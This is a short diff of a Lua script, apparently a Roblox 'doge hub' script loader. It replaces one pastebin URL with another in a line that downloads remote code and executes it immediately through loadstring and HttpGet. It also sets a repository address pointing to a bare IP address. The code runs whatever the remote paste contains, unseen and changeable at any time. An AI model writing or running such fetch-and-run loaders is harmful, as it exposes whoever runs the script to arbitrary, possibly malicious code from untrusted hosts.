@@ -3608,7 +3608,7 @@ print("loading doge hub")
 print('load_' .. tostring(counter))
 
 -- Load external script (make sure this is the intended use)
-loadstring(game:HttpGet("https://pastebin.com/raw/CYqXb6TX"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/RyZeKZiy"))()
 counter = counter + 1
 do
     local repo = "http://31.210.171.229:3000/new/"
